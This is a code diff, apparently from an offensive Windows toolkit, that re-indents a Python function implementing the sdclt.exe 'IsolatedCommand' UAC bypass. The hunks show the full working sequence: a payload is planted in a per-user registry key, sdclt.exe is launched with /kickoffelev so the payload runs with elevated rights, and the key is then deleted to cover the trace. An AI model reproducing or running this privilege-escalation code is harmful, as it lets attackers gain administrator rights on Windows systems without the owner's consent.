@@ -30,12 +30,12 @@ def sdclt_isolatedcommand():
 	print " {} sdclt_isolatedcommand: Attempting to create registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\exefile\shell\runas\command"))					
+					os.path.join("Software\Classes\exefile\shell\runas\command"))					
 		_winreg.SetValueEx(key,
-							"IsolatedCommand",
-							0,
-							_winreg.REG_SZ,
-							payload)
+				"IsolatedCommand",
+				0,
+				_winreg.REG_SZ,
+				payload)
 		_winreg.CloseKey(key)
 		print " {} sdclt_isolatedcommand: Registry key created".format(successBox())
 	except Exception as error:
@@ -48,7 +48,7 @@ def sdclt_isolatedcommand():
 	print " {} sdclt_isolatedcommand: Attempting to create process".format(infoBox())
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c sdclt.exe /kickoffelev",
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 		if (result[1] == 0):
 			print " {} sdclt_isolatedcommand: Process started successfully".format(successBox())
 		else:
@@ -62,7 +62,7 @@ def sdclt_isolatedcommand():
 		
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-							os.path.join("Software\Classes\exefile\shell\runas\command"))
+				os.path.join("Software\Classes\exefile\shell\runas\command"))
 		print " {} sdclt_isolatedcommand: Registry key was deleted".format(successBox())
 	except Exception as error:
 		print " {} sdclt_isolatedcommand: Unable to delete key".format(errorBox())
